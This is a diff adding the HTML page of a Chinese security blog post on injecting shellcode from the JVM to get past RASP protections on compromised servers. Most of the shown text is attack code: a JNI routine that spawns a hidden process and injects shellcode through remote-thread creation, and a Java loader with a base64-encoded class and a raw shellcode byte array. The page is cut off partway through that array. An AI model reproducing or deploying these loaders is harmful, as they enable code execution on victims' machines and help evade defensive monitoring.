@@ -1,0 +1,657 @@
+<!DOCTYPE html>
+<html  lang="zh">
+<head>
+    <meta charset="utf-8" />
+
+<meta name="generator" content="Hexo 3.8.0" />
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+<title>JVM Shellcode注入探索 - P1ay2win&#39;s blog</title>
+<meta name="twitter:card" content="summary_large_image">
+<meta property="og:site_name" content="P1ay2win's blog">
+<meta property="og:type" content="website">
+<meta property="og:title" content="JVM Shellcode注入探索 | P1ay2win's blog">
+<meta property="og:image" content="https://blog.play2win.top/2022/03/22/JVM_Shellcode注入探索/">
+<meta property="twitter:image" content="https://blog.play2win.top/2022/03/22/JVM_Shellcode注入探索/">
+
+
+
+
+
+
+<link rel="alternative" href="/atom.xml" title="JVM Shellcode注入探索" type="application/atom+xml">
+
+
+
+<link rel="icon" href="/images/header.png">
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css">
+
+
+    
+    
+<style>body>.footer,body>.navbar,body>.section{opacity:0}</style>
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">
+
+    
+    
+    
+    
+<link rel="stylesheet" href="/css/back-to-top.css">
+
+    
+    
+    
+    
+    
+    
+    
+    <link rel="stylesheet" href="/css/progressbar.css">
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+    
+    
+    
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+</head>
+<body class="is-3-column">
+    <nav class="navbar navbar-main">
+    <div class="container">
+        <div class="navbar-brand is-flex-center">
+            <a class="navbar-item navbar-logo" href="/">
+            
+                <img src="/images/header.png" alt="JVM Shellcode注入探索" height="28">
+                P1ay2win&#39;s blog
+            
+            </a>
+        </div>
+        <div class="navbar-menu">
+            
+            <div class="navbar-start">
+                
+                <a class="navbar-item"
+                href="/">主页</a>
+                
+                <a class="navbar-item"
+                href="/archives">归档</a>
+                
+                <a class="navbar-item"
+                href="/categories">分类</a>
+                
+                <a class="navbar-item"
+                href="/tags">标签</a>
+                
+            </div>
+            
+            <div class="navbar-end">
+                
+                    
+                    <a class="navbar-item" target="_blank" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                    
+                
+                
+                <a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;">
+                    <i class="fas fa-list-ul"></i>
+                </a>
+                
+                
+                <a class="navbar-item search" title="搜索" href="javascript:;">
+                    <i class="fas fa-search"></i>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+</nav>
+
+    
+    <section class="section">
+        <div class="container">
+            <div class="columns">
+                <div class="column is-8-tablet is-8-desktop is-9-widescreen has-order-2 column-main">
+<div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2022-03-22T14:25:53.000Z">2022-03-22</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/代码审计/">代码审计</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    27 分钟 读完 (大约 4065 个字)
+                </span>
+                
+                
+                    <i class="fa fa-eye"></i> <span id="busuanzi_value_page_pv"></span>次阅读
+                
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                JVM Shellcode注入探索
+            
+        </h1>
+        <div class="content">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>随着RASP技术的发展，普通webshell已经很难有用武之地，甚至是各种内存马也逐渐捉襟见肘。秉承着《<a href="https://www.anquanke.com/post/id/214435" target="_blank" rel="noopener">JSP Webshell那些事——攻击篇（上）</a>》中向下走的思路，存不存在一种在Java代码中执行机器码的方法呢？答案是肯定的，常见的注入方式有JNI、JNA和利用JDK自带的Native方法等，其中笔者还找到了一种鲜有文章介绍的，基于HotSpot虚拟机，且较为通用的注入方法。</p>
+<a id="more"></a>
+<h2 id="基于JNI"><a href="#基于JNI" class="headerlink" title="基于JNI"></a>基于JNI</h2><p>Java底层虽然是C/C++实现的，但不能直接执行C/C++代码。若想要执行C/C++的代码，一般得通过JNI，即Java本地调用（Java Native Interface），加载JNI链接库，调用Native方法实现。</p>
+<p>Cobalt Strike官网博客上有一篇《<a href="https://www.cobaltstrike.com/blog/how-to-inject-shellcode-from-java/" target="_blank" rel="noopener">如何从Java注入shellcode</a>》的文章，便是基于JNI实现，通过Native方法调用C/C++代码将shellcode注入到内存中。</p>
+<figure class="highlight c++ hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">//C/C++代码中声明的函数对应Demo#inject本地方法</span></span><br><span class="line"><span class="hljs-function">JNIEXPORT <span class="hljs-keyword">void</span> JNICALL <span class="hljs-title">Java_Demo_inject</span><span class="hljs-params">(JNIEnv * env, jobject object, jbyteArray jdata)</span> </span>&#123;</span><br><span class="line">   jbyte * data = (*env)-&gt;GetByteArrayElements(env, jdata, <span class="hljs-number">0</span>);</span><br><span class="line">   jsize length = (*env)-&gt;GetArrayLength(env, jdata);</span><br><span class="line">   inject((LPCVOID)data, (SIZE_T)length);</span><br><span class="line">   (*env)-&gt;ReleaseByteArrayElements(env, jdata, data, <span class="hljs-number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c++ hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">//执行注入shellcode的代码</span></span><br><span class="line"><span class="hljs-comment">/* inject some shellcode... enclosed stuff is the shellcode y0 */</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">inject</span><span class="hljs-params">(LPCVOID buffer, <span class="hljs-keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">    STARTUPINFO si;</span><br><span class="line">    PROCESS_INFORMATION pi;</span><br><span class="line">    HANDLE hProcess   = <span class="hljs-literal">NULL</span>;</span><br><span class="line">    SIZE_T wrote;</span><br><span class="line">    LPVOID ptr;</span><br><span class="line">    <span class="hljs-keyword">char</span> lbuffer[<span class="hljs-number">1024</span>];</span><br><span class="line">    <span class="hljs-keyword">char</span> cmdbuff[<span class="hljs-number">1024</span>];</span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment">/* reset some stuff */</span></span><br><span class="line">    ZeroMemory( &amp;si, <span class="hljs-keyword">sizeof</span>(si) );</span><br><span class="line">    si.cb = <span class="hljs-keyword">sizeof</span>(si);</span><br><span class="line">    ZeroMemory( &amp;pi, <span class="hljs-keyword">sizeof</span>(pi) );</span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment">/* start a process */</span></span><br><span class="line">    GetStartupInfo(&amp;si);</span><br><span class="line">    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;</span><br><span class="line">    si.wShowWindow = SW_HIDE;</span><br><span class="line">    si.hStdOutput = <span class="hljs-literal">NULL</span>;</span><br><span class="line">    si.hStdError = <span class="hljs-literal">NULL</span>;</span><br><span class="line">    si.hStdInput = <span class="hljs-literal">NULL</span>;</span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment">/* resolve windir? */</span></span><br><span class="line">    GetEnvironmentVariableA(<span class="hljs-string">"windir"</span>, lbuffer, <span class="hljs-number">1024</span>);</span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment">/* setup our path... choose wisely for 32bit and 64bit platforms */</span></span><br><span class="line">    <span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _IS64_</span></span><br><span class="line">        _snprintf(cmdbuff, <span class="hljs-number">1024</span>, <span class="hljs-string">"%s\\SysWOW64\\notepad.exe"</span>, lbuffer);</span><br><span class="line">    <span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span></span><br><span class="line">        _snprintf(cmdbuff, <span class="hljs-number">1024</span>, <span class="hljs-string">"%s\\System32\\notepad.exe"</span>, lbuffer);</span><br><span class="line">    <span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span></span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment">/* spawn the process, baby! */</span></span><br><span class="line">    <span class="hljs-keyword">if</span> (!CreateProcessA(<span class="hljs-literal">NULL</span>, cmdbuff, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, TRUE, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si, &amp;pi))</span><br><span class="line">        <span class="hljs-keyword">return</span>;</span><br><span class="line">  </span><br><span class="line">    hProcess = pi.hProcess;</span><br><span class="line">    <span class="hljs-keyword">if</span>( !hProcess )</span><br><span class="line">        <span class="hljs-keyword">return</span>;</span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment">/* allocate memory in our process */</span></span><br><span class="line">    ptr = (LPVOID)VirtualAllocEx(hProcess, <span class="hljs-number">0</span>, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment">/* write our shellcode to the process */</span></span><br><span class="line">    WriteProcessMemory(hProcess, ptr, buffer, (SIZE_T)length, (SIZE_T *)&amp;wrote);</span><br><span class="line">    <span class="hljs-keyword">if</span> (wrote != length)</span><br><span class="line">        <span class="hljs-keyword">return</span>;</span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment">/* create a thread in the process */</span></span><br><span class="line">    CreateRemoteThread(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, ptr, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这种方法需要自行编写个链接库，并上传到受害服务器上，利用起来并不显得优雅。</p>
+<p>还有另一种方法是利用JNA第三方库，可以直接调用内核的函数，实现Shellcode注入。在<a href="https://yzddmr6.com/" target="_blank" rel="noopener">@yzddmr6</a>师傅的<a href="https://github.com/yzddmr6/Java-Shellcode-Loader" target="_blank" rel="noopener">Java-Shellcode-Loader</a>项目中有实现，但JNA本质上还是基于JNI，使用时还是要加载JNA自己的链接库，并且JDK中默认不包含JNA这个类库，使用时需要想办法引入。</p>
+<h2 id="基于JDK自带的Native方法"><a href="#基于JDK自带的Native方法" class="headerlink" title="基于JDK自带的Native方法"></a>基于JDK自带的Native方法</h2><p>第一个介绍的可能是冰蝎的作者@<a href="https://github.com/rebeyond" target="_blank" rel="noopener">rebeyond</a>师傅首先发现的方法，一种基于JDK自带的Native方法的shellcode注入，严格来说是基于HotSpot虚拟机的JDK的自带Native方法。它是<code>sun/tools/attach/VirtualMachineImpl#enqueue</code>Native方法，存在于用于attach Java进程的<code>tools.jar</code>包中。</p>
+<p>当运行在Windows上时，相应的<code>enqueue</code> Native方法实现在<a href="https://github.com/openjdk/jdk/blob/9623d5bb46d14018a2b777fb7ffed6c66d912c84/src/jdk.attach/windows/native/libattach/VirtualMachineImpl.c" target="_blank" rel="noopener">/src/jdk.attach/windows/native/libattach/VirtualMachineImpl.c</a>中，其中<strong>Create thread in target process to execute code</strong>的操作，不能说跟前面Cobalt Strike注入shellcode的操作毫不相干，只能说是一模一样。</p>
+<figure class="highlight c++ hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">JNIEXPORT <span class="hljs-keyword">void</span> JNICALL Java_sun_tools_attach_VirtualMachineImpl_enqueue</span><br><span class="line">  (JNIEnv *env, jclass cls, jlong handle, jbyteArray stub, jstring cmd,</span><br><span class="line">   jstring pipename, jobjectArray args)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment">     * Allocate memory in target process for data and code stub</span></span><br><span class="line"><span class="hljs-comment">     * (assumed aligned and matches architecture of target process)</span></span><br><span class="line"><span class="hljs-comment">     */</span></span><br><span class="line">    hProcess = (HANDLE)handle;</span><br><span class="line"></span><br><span class="line">    pData = (DataBlock*) VirtualAllocEx( hProcess, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(DataBlock), MEM_COMMIT, PAGE_READWRITE );</span><br><span class="line">    <span class="hljs-keyword">if</span> (pData == <span class="hljs-literal">NULL</span>) &#123;</span><br><span class="line">        JNU_ThrowIOExceptionWithLastError(env, <span class="hljs-string">"VirtualAllocEx failed"</span>);</span><br><span class="line">        <span class="hljs-keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    WriteProcessMemory( hProcess, (LPVOID)pData, (LPCVOID)&amp;data, (SIZE_T)<span class="hljs-keyword">sizeof</span>(DataBlock), <span class="hljs-literal">NULL</span> );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    stubLen = (DWORD)(*env)-&gt;GetArrayLength(env, stub);</span><br><span class="line">    stubCode = (*env)-&gt;GetByteArrayElements(env, stub, &amp;isCopy);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> ((*env)-&gt;ExceptionOccurred(env)) <span class="hljs-keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    pCode = (PDWORD) VirtualAllocEx( hProcess, <span class="hljs-number">0</span>, stubLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE );</span><br><span class="line">    <span class="hljs-keyword">if</span> (pCode == <span class="hljs-literal">NULL</span>) &#123;</span><br><span class="line">        JNU_ThrowIOExceptionWithLastError(env, <span class="hljs-string">"VirtualAllocEx failed"</span>);</span><br><span class="line">        VirtualFreeEx(hProcess, pData, <span class="hljs-number">0</span>, MEM_RELEASE);</span><br><span class="line">        (*env)-&gt;ReleaseByteArrayElements(env, stub, stubCode, JNI_ABORT);</span><br><span class="line">        <span class="hljs-keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    WriteProcessMemory( hProcess, (LPVOID)pCode, (LPCVOID)stubCode, (SIZE_T)stubLen, <span class="hljs-literal">NULL</span> );</span><br><span class="line">    (*env)-&gt;ReleaseByteArrayElements(env, stub, stubCode, JNI_ABORT);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment">     * Create thread in target process to execute code</span></span><br><span class="line"><span class="hljs-comment">     */</span></span><br><span class="line">    hThread = CreateRemoteThread( hProcess,</span><br><span class="line">                                  <span class="hljs-literal">NULL</span>,</span><br><span class="line">                                  <span class="hljs-number">0</span>,</span><br><span class="line">                                  (LPTHREAD_START_ROUTINE) pCode,</span><br><span class="line">                                  pData,</span><br><span class="line">                                  <span class="hljs-number">0</span>,</span><br><span class="line">                                  <span class="hljs-literal">NULL</span> );</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>当然你不能说这个是bug，只能说是feature。</p>
+<p><img src="/2022/03/22/JVM_Shellcode注入探索/61wBNHEt0OL.jpg" alt></p>
+<p>相应的Demo是比较简单，在<code>stub</code>参数中传入shellcode即可，@<a href="https://github.com/rebeyond" target="_blank" rel="noopener">rebeyond</a>师傅已经给出了代码，笔者在这里做了点简化。不过实现Native方法的链接库<code>attach.dll</code>默认存在，但<code>tools.jar</code>这个包不一定存在，@<a href="https://github.com/rebeyond" target="_blank" rel="noopener">rebeyond</a>师傅巧妙的利用了双亲委派机制，当JVM中没有加载<code>VirtualMachineImpl</code>类时，就会使用下面base64编码的类替代。当然这种方法仅适用于Windows，因为Linux下<code>enqueue</code>并不是这么实现的。</p>
+<figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="hljs-keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="hljs-keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WindowsAgentShellcodeLoader</span> </span>&#123;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">            String classStr = <span class="hljs-string">"yv66vgAAADQAMgoABwAjCAAkCgAlACYF//////////8IACcHACgKAAsAKQcAKgoACQArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAChMc3VuL3Rvb2xzL2F0dGFjaC9XaW5kb3dzVmlydHVhbE1hY2hpbmU7AQAHZW5xdWV1ZQEAPShKW0JMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9PYmplY3Q7KVYBAApFeGNlcHRpb25zBwAtAQALb3BlblByb2Nlc3MBAAQoSSlKAQADcnVuAQAFKFtCKVYBAAR2YXIyAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQADYnVmAQACW0IBAA1TdGFja01hcFRhYmxlBwAqAQAKU291cmNlRmlsZQEAGldpbmRvd3NWaXJ0dWFsTWFjaGluZS5qYXZhDAAMAA0BAAZhdHRhY2gHAC4MAC8AMAEABHRlc3QBABBqYXZhL2xhbmcvT2JqZWN0DAATABQBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAxAA0BACZzdW4vdG9vbHMvYXR0YWNoL1dpbmRvd3NWaXJ0dWFsTWFjaGluZQEAE2phdmEvaW8vSU9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQALbG9hZExpYnJhcnkBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAA9wcmludFN0YWNrVHJhY2UAIQALAAcAAAAAAAQAAQAMAA0AAQAOAAAAMwABAAEAAAAFKrcAAbEAAAACAA8AAAAKAAIAAAAGAAQABwAQAAAADAABAAAABQARABIAAAGIABMAFAABABUAAAAEAAEAFgEIABcAGAABABUAAAAEAAEAFgAJABkAGgABAA4AAAB6AAYAAgAAAB0SArgAAxQABCoSBhIGA70AB7gACKcACEwrtgAKsQABAAUAFAAXAAkAAwAPAAAAGgAGAAAADgAFABAAFAATABcAEQAYABIAHAAVABAAAAAWAAIAGAAEABsAHAABAAAAHQAdAB4AAAAfAAAABwACVwcAIAQAAQAhAAAAAgAi"</span>;</span><br><span class="line">            Class clazz = <span class="hljs-keyword">new</span> MyClassLoader().get(Base64.getDecoder().decode(classStr));</span><br><span class="line">            <span class="hljs-keyword">byte</span> buf[] = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[]&#123;</span><br><span class="line">                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xFC</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x83</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xE4</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xF0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xE8</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xC0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x51</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x50</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x52</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x51</span>,</span><br><span class="line">                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x56</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x31</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xD2</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x65</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8B</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x52</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x60</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8B</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x52</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x18</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8B</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x52</span>,</span><br><span class="line">                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x20</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8B</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x72</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x50</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x0F</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xB7</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4A</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4A</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4D</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x31</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xC9</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x31</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xC0</span>,</span><br><span class="line">                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xAC</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x3C</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x61</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x7C</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x02</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x2C</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x20</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xC1</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xC9</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x0D</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xC1</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xE2</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xED</span>,</span><br><span class="line">                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x52</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x51</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8B</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x52</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x20</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8B</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x42</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x3C</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xD0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8B</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x80</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x88</span>,</span><br><span class="line">                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x85</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xC0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x74</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x67</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xD0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x50</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8B</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x18</span>, (<span 